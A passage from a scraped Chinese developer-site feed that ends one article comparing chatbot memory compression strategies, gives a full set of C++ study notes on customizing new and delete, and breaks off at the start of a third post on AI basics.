<table><thead><tr><th>策略</th><th>Token</th><th>压缩率</th><th>速度</th><th>成本</th><th>信息保留</th></tr></thead><tbody><tr><td>滑动窗口</td><td>145</td><td>74%</td><td>0.00ms</td><td>$0</td><td>0%</td></tr><tr><td>Token动态</td><td>193</td><td>66%</td><td>0.53ms</td><td>$0</td><td>依赖预算</td></tr><tr><td>LLM摘要</td><td>597</td><td>-7%</td><td>13,446ms</td><td>$0.0001</td><td>100%</td></tr><tr><td>混合策略</td><td>604</td><td>-8%</td><td>11,663ms</td><td>$0.0001</td><td>100%</td></tr></tbody></table>
<h4 data-id="heading-128"><strong>适用场景快速匹配</strong></h4>













































<table><thead><tr><th>场景特征</th><th>推荐策略</th><th>核心原因</th></tr></thead><tbody><tr><td>对话≤10轮</td><td>滑动窗口</td><td>简单够用</td></tr><tr><td>对话10-30轮</td><td>混合策略</td><td>自动适应</td></tr><tr><td>对话≥30轮</td><td>LLM摘要</td><td>唯一正收益</td></tr><tr><td>Token限制严格</td><td>Token动态</td><td>精确控制</td></tr><tr><td>成本敏感</td><td>滑动窗口</td><td>零成本</td></tr><tr><td>实时要求</td><td>滑动窗口</td><td>最快</td></tr><tr><td>必须记住用户</td><td>混合策略/LLM</td><td>信息保留</td></tr></tbody></table>
<h4 data-id="heading-129"><strong>性能基准</strong></h4>
<pre><code class="hljs language-diff" lang="diff">速度基准（20轮对话）：
<span class="hljs-deletion">- 滑动窗口: 0.00ms    ← 最快</span>
<span class="hljs-deletion">- Token动态: 0.53ms    ← 可接受</span>
<span class="hljs-deletion">- LLM摘要:  11,663ms   ← 慢22,000倍</span>

Token基准（20轮对话）：
<span class="hljs-deletion">- 滑动窗口: 145 tokens  ← 最少</span>
<span class="hljs-deletion">- Token动态: 193 tokens ← +33%</span>
<span class="hljs-deletion">- LLM摘要:  597 tokens  ← +312%</span>

成本基准（100次压缩）：
<span class="hljs-deletion">- 滑动窗口: $0         ← 免费</span>
<span class="hljs-deletion">- Token动态: $0         ← 免费</span>
<span class="hljs-deletion">- 混合策略:  $0.008     ← 看场景</span>
<span class="hljs-deletion">- LLM摘要:  $0.01       ← 最贵</span>
</code></pre>
<hr/>
<h3 data-id="heading-130"><strong>4.12 小结：测试改变了什么</strong></h3>
<p><strong>测试前的想法：</strong></p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-bullet">1.</span> LLM摘要应该是最好的（智能嘛）
<span class="hljs-bullet">2.</span> 混合策略综合优点，应该无敌
<span class="hljs-bullet">3.</span> Token动态精确控制，应该最省
<span class="hljs-bullet">4.</span> Deque比List快很多，必须用
</code></pre>
<p><strong>测试后的认知：</strong></p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-bullet">1.</span> LLM摘要短对话是负优化 ❌
<span class="hljs-bullet">2.</span> 混合策略长对话Token多4倍 ❌
<span class="hljs-bullet">3.</span> Token动态可能比滑动窗口多58% ❌
<span class="hljs-bullet">4.</span> Deque只快8%，差异微乎其微 ❌
</code></pre>
<p><strong>最重要的领悟：</strong></p>
<pre><code class="hljs language-vbnet" lang="vbnet">✅ 没有<span class="hljs-string">"最好"</span>的策略
✅ 只有<span class="hljs-string">"最适合"</span>的策略
✅ 简单方案往往是最优解
✅ Trade-<span class="hljs-keyword">off</span>无处不在
✅ 测试胜过直觉
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0e09910705d441bb819aaf395055db30~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQWdlbnRCdWlsZGVy:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765471478&amp;x-signature=CRhlK%2BAiTVvMWYrPi%2F01uslRW28%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-131"><strong>五、总结与展望</strong></h2>
<h3 data-id="heading-132"><strong>5.1 核心收获</strong></h3>
<p>通过这次完整的实战，我们得到了以下关键认知：</p>
<p><strong>1. 没有"完美"的策略</strong></p>
<ul>
<li>滑动窗口：最快、最省、最简单，但会丢信息</li>
<li>LLM摘要：保留信息，但慢且贵</li>
<li>混合策略：自动适应，但复杂</li>
<li>Token动态：精确控制，但可能用更多Token</li>
</ul>
<p><strong>2. 简单往往是最优解</strong></p>
<ul>
<li>80%场景：滑动窗口就够了</li>
<li>20%场景：才需要"智能"策略</li>
<li>过度优化反而降低效率</li>
</ul>
<p><strong>3. 测试胜过直觉</strong></p>
<ul>
<li>5个反直觉发现</li>
<li>避免了4个错误决策</li>
<li>节省了大量成本</li>
</ul>
<h3 data-id="heading-133"><strong>5.2 实战成果</strong></h3>
<p>完整的代码已开源：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fsotopelaez092-star%2Fmemory-chatbot" target="_blank" title="https://github.com/sotopelaez092-star/memory-chatbot" ref="nofollow noopener noreferrer">github.com/sotopelaez0…</a></p>
<p><strong>包含：</strong></p>
<ul>
<li>✅ 4种压缩策略的完整实现</li>
<li>✅ 真实的性能测试代码</li>
<li>✅ 详细的测试数据</li>
<li>✅ 可直接运行的示例</li>
</ul>
<p><strong>Star和Fork支持！</strong> ⭐</p>
<h3 data-id="heading-134"><strong>5.3 后续计划</strong></h3>
<p>记忆系统还有很多待探索的方向：</p>
<p><strong>系列文章第二篇：中期记忆架构</strong></p>
<ul>
<li>Redis缓存设计</li>
<li>PostgreSQL持久化</li>
<li>向量检索优化</li>
<li>生产环境部署</li>
</ul>
<p><strong>系列文章第三篇：长期记忆</strong></p>
<ul>
<li>知识图谱</li>
<li>语义检索</li>
<li>个性化推荐</li>
</ul>
<p><strong>敬请期待！</strong></p>
<hr/>
<p>如果这篇文章对你有帮助，欢迎：</p>
<ul>
<li>🌟 给GitHub项目点个Star</li>
<li>👍 点赞支持</li>
<li>💬 留言讨论</li>
<li>🔄 分享给更多人</li>
</ul>
<p>感谢阅读！</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[8. 定制new和delete]]></title>    <link>https://juejin.cn/post/7579871631096135706</link>    <guid>https://juejin.cn/post/7579871631096135706</guid>    <pubDate>2025-12-04T16:48:37.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7579871631096135706" data-draft-id="7579512734296309798" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="8. 定制new和delete"/> <meta itemprop="keywords" content="C++"/> <meta itemprop="datePublished" content="2025-12-04T16:48:37.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="程序猿本员"/> <meta itemprop="url" content="https://juejin.cn/user/3868510676597259"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            8. 定制new和delete
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3868510676597259/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    程序猿本员
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-04T16:48:37.000Z" title="Thu Dec 04 2025 16:48:37 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-04
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#595959;font-size:15px;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(60,10,30,.04) 3%,transparent 0),linear-gradient(1turn,rgba(60,10,30,.04) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body p{color:#595959;font-size:15px;line-height:2;font-weight:400}.markdown-body p+p{margin-top:16px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin:0;color:#135ce0}.markdown-body h1{position:relative;text-align:center;font-size:22px;margin:50px 0}.markdown-body h1:before{position:absolute;content:"";top:-10px;left:50%;width:32px;height:32px;transform:translateX(-50%);background-size:100% 100%;opacity:.36;background-repeat:no-repeat;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAABfVBMVEX///8Ad/8AgP8AgP8AgP8Aff8AgP8Af/8AgP8AVf8Af/8Af/8AgP8AgP8Af/8Afv8AAP8Afv8Afv8Aef8AgP8AdP8Afv8AgP8AgP8Acf8Ae/8AgP8Af/8AgP8Af/8Af/8AfP8Afv8AgP8Af/8Af/8Afv8Afv8AgP8Afv8AgP8Af/8Af/8AgP8AgP8Afv8AgP8Af/8AgP8AgP8AgP8Ae/8Afv8Af/8AgP8Af/8AgP8Af/8Af/8Aff8Af/8Abf8AgP8Af/8AgP8Af/8Af/8Afv8AgP8AgP8Afv8Afv8AgP8Af/8Aff8AgP8Afv8AgP8Aff8AgP8AfP8AgP8Ae/8AgP8Af/8AgP8AgP8AgP8Afv8AgP8AgP8AgP8Afv8AgP8AgP8AgP8AgP8AgP8Af/8AgP8Af/8Af/8Aev8Af/8AgP8Aff8Afv8AgP8AgP8AgP8Af/8AgP8Af/8Af/8AgP8Afv8AgP8AgP8AgP8AgP8Af/8AeP8Af/8Af/8Af//////rzEHnAAAAfXRSTlMAD7CCAivatxIDx5EMrP19AXdLEwgLR+6iCR/M0yLRzyFF7JupSXn8cw6v60Q0QeqzKtgeG237HMne850/6Qeq7QaZ+WdydHtj+OM3qENCMRYl1B3K2U7wnlWE/mhlirjkODa9FN/BF7/iNV/2kASNZpX1Wlf03C4stRGxgUPclqoAAAABYktHRACIBR1IAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4gEaBzgZ4yeM3AAAAT9JREFUOMvNUldbwkAQvCAqsSBoABE7asSOBRUVVBQNNuy9996789+9cMFAMHnVebmdm+/bmdtbQv4dOFOW2UjPzgFyLfo6nweKfIMOBYWwFtmMPGz2Yj2pJI0JDq3udJW6VVbmKa9I192VQFV1ktXUAl5NB0cd4KpnORqsEO2ZIRpF9gJfE9Dckqq0KuZt7UAH5+8EPF3spjsRpCeQNO/tA/qDwIDA+OCQbBoKA8NOdjMySgcZGVM6jwcgRuUiSs0nlPFNSrEpJfU0jTLD6llqbvKxei7OzvkFNQohi0vAsj81+MoqsCaoPOQFgus/1LyxichW+hS2JWCHZ7VlF9jb187pIAYcHiViHAMnp5mTjJ8B5xeEXF4B1ze/fTh/C0h398DDI9HB07O8ci+vRBdvdGnfP4gBuM8vw7X/G3wDmFhFZEdxzjMAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTgtMDEtMjZUMDc6NTY6MjUrMDE6MDA67pVWAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE4LTAxLTI2VDA3OjU2OjI1KzAxOjAwS7Mt6gAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAAWdEVYdFRpdGxlAGp1ZWppbl9sb2dvIGNvcHlxapmKAAAAV3pUWHRSYXcgcHJvZmlsZSB0eXBlIGlwdGMAAHic4/IMCHFWKCjKT8vMSeVSAAMjCy5jCxMjE0uTFAMTIESANMNkAyOzVCDL2NTIxMzEHMQHy4BIoEouAOoXEXTyQjWVAAAAAElFTkSuQmCC)}.markdown-body h2{position:relative;font-size:20px;border-left:4px solid;padding:0 0 0 10px;margin:30px 0}.markdown-body h3{font-size:16px}.markdown-body ul{list-style:disc outside;margin-left:2em;margin-top:1em}.markdown-body li{line-height:2;color:#595959}.markdown-body img.loaded{margin:0 auto;display:block}.markdown-body blockquote{background:#fff9f9;margin:2em 0;padding:2px 20px;border-left:4px solid #b2aec5}.markdown-body blockquote p{color:#666;line-height:2}.markdown-body a{color:#036aca;border-bottom:1px solid rgba(3,106,202,.8);font-weight:400;text-decoration:none}.markdown-body em strong,.markdown-body strong{color:#036aca}.markdown-body hr{border-top:1px solid #135ce0}.markdown-body pre{overflow:auto}.markdown-body code,.markdown-body pre{overflow:auto;position:relative;line-height:1.75;font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body table{border-collapse:collapse;margin:1rem 0;overflow-x:auto}.markdown-body table td,.markdown-body table th{border:1px solid #dfe2e5;padding:.6em 1em}.markdown-body table tr{border-top:1px solid #dfe2e5}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">小结</h2>
<ol>
<li><code>new关键字</code>分为两步，<code>operator new</code>和<code>狭义placement new</code>，前者内存分配，后者在特定内存上调用构造函数</li>
<li><code>operator new</code>又可设置<code>std::nothrow</code>，设置之后就代表本次分配不足直接返回<code>nullptr</code>，未设置则调用<code>new-handler()</code>，函数返回之后继续尝试重新分配，循环此过程直到成功或抛出<code>std::bad_alloc</code>或函数调用<code>std::abort()</code>终止程序</li>
<li>编写new和delete需要遵守一些规则，比如处理<code>size==0</code>以及空指针等</li>
<li>本章的<code>placement new</code>重载是广义的，专门刨除<code>狭义placement new</code>，如果重载了<code>placement new</code>，要配套对应的<code>placement delete</code>；另外这种可能导致遮掩，使得普通new没法使用</li>
</ol>
<h2 data-id="heading-1">49. 了解new-handler的行为</h2>
<blockquote>
<p>本章operator new只有在没设置std::nothrow才会在分配内存失败后调用new-handler，所以此章默认不设置</p>
</blockquote>
<ol>
<li><code>operator new</code> 的设计逻辑是：
<ol>
<li>分配失败 → 调用 <code>new_handler</code>。（<strong>用户可以通过<code>std::set-new-handler()</code>来设置该函数</strong>）</li>
</ol>
<ul>
<li><strong>期望</strong> <code>new_handler</code> 能通过某种方式（如释放预留内存）让后续分配成功。</li>
<li>如果 <code>new_handler</code> 返回后分配仍失败，则<strong>再次调用 <code>new_handler</code></strong>。</li>
</ul>
<ol start="2">
<li>如果 <code>new_handler</code> 不改变任何状态，分配会一直失败，形成无限递归。所有需要一个好的设计：</li>
</ol>
<ul>
<li>让更多内存可被使用，即<strong>释放预留内存</strong></li>
<li>终止程序，调用std::abort();</li>
<li>抛出异常，throw std::bad_alloc;</li>
<li>将函数设置成nullptr，这样系统会自动抛出异常</li>
</ul>
</li>
<li>给每种class设置不同的<code>new_handler</code>，做到<code>Widget::set_new_handler(func);Widget* ptr = new Widget();//如果分配失败调用的是func</code>
<ol>
<li>为每种class设置不同的设置class</li>
</ol>
<ul>
<li>该函数属于class，应该使用<strong>静态成员函数</strong></li>
<li>要给每种，可借助<strong>继承+template</strong>来为每种class具象化基类class</li>
</ul>
<ol start="2">
<li>template基类的<strong>类型参数仅仅是用于标识不同类型</strong>，如<code>Widget</code>继承<code>NewHandlerSupport&lt;Widget&gt;</code></li>
<li>每次调用new，需要调用set_new_handler()设置成本类自定义的函数，分配内存之后（成与不成）都得再次调用set_new_handler()设置回去，这里借助<strong>RAII，将函数看成资源</strong>，这样就能在退出<code>operator new</code>之后自动设置回去</li>
</ol>
</li>
<li>调用<code>new (std::nothrow) Widget()</code>，并不意味着不会抛出异常，因为这之后还会调用<code>Widget</code>构造函数，可能会继续调用new，进而抛出异常</li>
</ol>
<h2 data-id="heading-2">50. 了解new和delete的合理替换时机</h2>
<ol>
<li>替换new和delete的原因有很多，比如想实现内存池、检测运用上的错误（比如多分配两个int，前后填入标识）以及收集heap使用信息等</li>
<li>自定义的new分为几乎行得通（逻辑没问题）和<strong>真正行得通</strong>，前者就是没有在意一些细节，比如new中需要循环调用new_handler，另外就是有对齐问题，<code>::operator new</code>肯定返回的是对齐后的地址，但是如果再基于此地址去偏移（如在前面添加标志位），然后在偏移后的地址构造就可能没有对齐进而出问题</li>
</ol>
<h2 data-id="heading-3">51. 编写new和delete时需固守成规</h2>
<ol>
<li>operator new应该内含无限循环，并在其中尝试分配内存，如果它无法满足内存要求，则调用new-handler。同时也要有能力处理0bytes申请。Class专属版本（因为可能存在继承，Derived调用Base的new方法）则还应该处理“比正确大小更大的（错误）申请”，一般是调用<code>::operator new</code></li>
<li>operator delete应该在收到nullptr不做任何处理，Class专属版本还应该处理“比正确大小更大的申请”，一般是调用<code>::operator delete</code></li>
</ol>
<h2 data-id="heading-4">52. 写了placement new也要写placement delete</h2>
<ol>
<li><strong>这里术语placement new指的是operator new()参数不止是size_t，比如日志函数等</strong>，其实nothrow版本也就是placement new，此处并不包含狭义的定位new</li>
<li>当使用 <strong>placement new构造对象失败（构造函数抛出异常）</strong> 时，编译器会自动调用<strong>匹配的placement delete</strong>释放内存。若未定义匹配的placement delete，已分配的内存将泄漏。</li>
<li>如果使用placement new构造，显式调用<code>delete p</code>时，编译器会调用<strong>普通operator delete</strong>（<code>operator delete(size_t)</code>），而非placement delete。</li>
<li>所以对于一个placement new，需要写operator delete（无异常情况）和placement delete（构造抛出异常）两个函数</li>
<li>若派生类定义了<strong>任何operator new重载</strong>（含placement new），会<strong>遮掩基类的所有operator new以及全局的operator new版本</strong>（包括普通版本）。需显式using声明继承基类或全局版本</li>
<li>所以如果重构了placement new而没有重构普通版本，直接调用<code>new Widget()</code>报错，因为被遮掩了</li>
</ol>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span>

<span class="hljs-keyword">class</span> <span class="hljs-title class_">Widget</span> {
<span class="hljs-keyword">public</span>:
    <span class="hljs-comment">// 自定义 placement new（带额外参数）</span>
    <span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">void</span>* <span class="hljs-keyword">operator</span> <span class="hljs-title">new</span><span class="hljs-params">(<span class="hljs-type">size_t</span> size, <span class="hljs-type">int</span> extra_arg)</span> </span>{
        std::cout &lt;&lt; <span class="hljs-string">"调用自定义 placement new\n"</span>;
        <span class="hljs-keyword">return</span> ::<span class="hljs-keyword">operator</span> <span class="hljs-built_in">new</span>(size); <span class="hljs-comment">// 委托全局 operator new</span>
    }

    <span class="hljs-comment">// ❌ 未显式保留普通 operator new</span>
};

<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{
    Widget* p1 = <span class="hljs-built_in">new</span>(<span class="hljs-number">42</span>) <span class="hljs-built_in">Widget</span>(); <span class="hljs-comment">// ✅ 调用自定义 placement new</span>
    Widget* p2 = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Widget</span>();     <span class="hljs-comment">// ❌ 报错：找不到普通 operator new</span>
}
</code></pre>
<ol start="7">
<li>cpp全局标准的operator new，<strong>如果定义了class专属new，切记导致的遮掩现象</strong></li>
</ol>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;new&gt;</span> <span class="hljs-comment">// 为了不抛错以及定位new</span></span>

<span class="hljs-function"><span class="hljs-type">void</span>* <span class="hljs-keyword">operator</span> <span class="hljs-title">new</span><span class="hljs-params">(std::<span class="hljs-type">size_t</span> size)</span></span>;
<span class="hljs-function"><span class="hljs-type">void</span>* <span class="hljs-keyword">operator</span> <span class="hljs-title">new</span><span class="hljs-params">(std::<span class="hljs-type">size_t</span> size, <span class="hljs-type">const</span> std::<span class="hljs-type">nothrow_t</span>&amp;)</span> <span class="hljs-keyword">noexcept</span></span>; <span class="hljs-comment">// 不抛错的版本</span>
<span class="hljs-function"><span class="hljs-type">void</span>* <span class="hljs-keyword">operator</span> <span class="hljs-title">new</span><span class="hljs-params">(std::<span class="hljs-type">size_t</span> size, <span class="hljs-type">void</span>* ptr)</span> <span class="hljs-keyword">noexcept</span></span>;<span class="hljs-comment">//此版本是标准的placement new，不允许被重构</span>

<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>{
    <span class="hljs-type">int</span>* p = <span class="hljs-keyword">new</span> <span class="hljs-type">int</span>; <span class="hljs-comment">// 底层调用 operator new(sizeof(int))</span>
     <span class="hljs-type">int</span>* p = <span class="hljs-built_in">new</span> (std::nothrow) <span class="hljs-type">int</span>; <span class="hljs-comment">// 失败时 p == nullptr</span>
     <span class="hljs-type">char</span> buffer[<span class="hljs-built_in">sizeof</span>(<span class="hljs-type">int</span>)]; 
     <span class="hljs-type">int</span>* p = <span class="hljs-built_in">new</span> (buffer) <span class="hljs-built_in">int</span>(<span class="hljs-number">42</span>); <span class="hljs-comment">// 在 buffer 上构造 int</span>
}
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ai知识的初步了解]]></title>    <link>https://juejin.cn/post/7579813925996822569</link>    <guid>https://juejin.cn/post/7579813925996822569</guid>    <pubDate>2025-12-04T17:14:10.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7579813925996822569" data-draft-id="7579871631095988250" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ai知识的初步了解"/> <meta itemprop="keywords" content="AIGC"/> <meta itemprop="datePublished" content="2025-12-04T17:14:10.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="河畔的风"/> <meta itemprop="url" content="https://juejin.cn/user/791287056047591"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ai知识的初步了解
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/791287056047591/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    河畔的风
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-04T17:14:10.000Z" title="Thu Dec 04 2025 17:14:10 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-04
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252b3a}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px;color:#5e7ce0}.markdown-body h1{font-size:24px;margin-bottom:5px;margin-top:80px;position:relative;text-align:center}.markdown-body h2{font-size:20px;padding-bottom:12px;border-bottom:1px solid #dfe1e6}.markdown-body h3{font-size:18px;padding-bottom:0}.markdown-body h4{font-size:16px;margin-top:30px}.markdown-body h5{font-size:14px;margin-top:20px}.markdown-body h6{font-size:14px;margin-top:5px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #dfe1e6;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#ffeeed;color:#c73636;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#252b3a;background:#f8f8f8}.markdown-body a{position:relative;text-decoration:none;color:#5e7ce0;padding-right:18px;padding-bottom:4px}.markdown-body 